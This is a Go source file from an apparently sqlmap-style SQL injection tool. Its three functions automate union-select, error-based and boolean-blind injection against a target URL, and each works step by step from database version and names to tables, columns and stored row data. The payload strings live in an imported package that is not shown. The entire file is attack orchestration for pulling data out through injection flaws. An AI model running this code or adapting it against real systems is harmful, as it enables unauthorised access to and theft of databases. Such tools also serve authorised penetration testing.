package start

import (
	"github.com/EmYiQing/go-sqlmap/input"
	"github.com/EmYiQing/go-sqlmap/line"
	"github.com/EmYiQing/go-sqlmap/log"
	"github.com/EmYiQing/go-sqlmap/util"
)

// RunUnionSelect UnionSelect注入
func RunUnionSelect(target string, params input.Input, suffixList []string) bool {
	log.Info("start union select injection...")
	suffix, key := line.GetOrderByNum(suffixList, target)
	if key == 0 {
		return false
	}
	cleanUrl := util.GetCleanUrl(target)
	pos := line.GetUnionSelectPos(suffix, cleanUrl, key)
	if pos.StartIndex == 0 {
		return false
	}
	line.GetVersion(pos, suffix, cleanUrl, key)
	line.GetCurrentDatabase(pos, suffix, cleanUrl, key)
	line.GetAllDatabases(pos, suffix, cleanUrl, key)
	if params.Database != "" {
		line.GetAllTables(pos, suffix, cleanUrl, key, params.Database)
	}
	if params.Database != "" && params.Table != "" {
		line.GetColumns(pos, suffix, cleanUrl, key, params.Database, params.Table)
	}
	if params.Database != "" && params.Table != "" && len(params.Columns) > 0 {
		line.GetData(pos, suffix, cleanUrl, key, params.Database, params.Table, params.Columns)
	}
	return true
}

// RunErrorBased ErrorBased注入
func RunErrorBased(target string, params input.Input, suffixList []string) bool {
	log.Info("start error based injection...")
	success, suffix := line.DetectErrorBased(target, suffixList)
	if !success {
		return false
	}
	if params.Beta == true {
		line.GetVersionByErrorBasedPolygon(target, suffix)
		line.GetCurrentDatabaseByErrorBasedPolygon(target, suffix)
		line.GetAllDatabasesByErrorBasedPolygon(target, suffix)
		if params.Database != "" {
			line.GetAllTablesByErrorBasedPolygon(target, suffix, params.Database)
		}
		if params.Database != "" && params.Table != "" {
			line.GetAllColumnsByErrorBasedPolygon(target, suffix, params.Database, params.Table)
		}
		if params.Database != "" && params.Table != "" && len(params.Columns) > 0 {
			line.GetAllDataByErrorBasedPolygon(target, suffix, params.Database, params.Table, params.Columns)
		}
	} else {
		line.GetVersionByErrorBased(target, suffix)
		line.GetCurrentDatabaseByErrorBased(target, suffix)
		line.GetAllDatabasesByErrorBased(target, suffix)
		if params.Database != "" {
			line.GetAllTablesByErrorBased(target, suffix, params.Database)
		}
		if params.Database != "" && params.Table != "" {
			line.GetAllColumnsByErrorBased(target, suffix, params.Database, params.Table)
		}
		if params.Database != "" && params.Table != "" && len(params.Columns) > 0 {
			line.GetAllDataByErrorBased(target, suffix, params.Database, params.Table, params.Columns)
		}
	}
	return true
}

// RunBoolBlind BoolBlind注入
func RunBoolBlind(target string, params input.Input, suffixList []string) bool {
	log.Info("start bool blind injection...")
	success, suffix := line.GetBoolBlindSuffix(target, suffixList)
	if !success {
		return false
	}
	line.GetVersionByBoolBlind(target, suffix)
	line.GetCurrentDatabaseByBoolBlind(target, suffix)
	line.GetAllDatabasesByBoolBlind(target, suffix)
	if params.Database != "" {
		line.GetAllTablesByBoolBlind(target, suffix, params.Database)
	}
	if params.Database != "" && params.Table != "" {
		line.GetAllColumnsByBoolBlind(target, suffix, params.Database, params.Table)
	}
	if params.Database != "" && params.Table != "" && len(params.Columns) > 0 {
		line.GetAllDataByBoolBlind(target, suffix, params.Database, params.Table, params.Columns)
	}
	return true
}
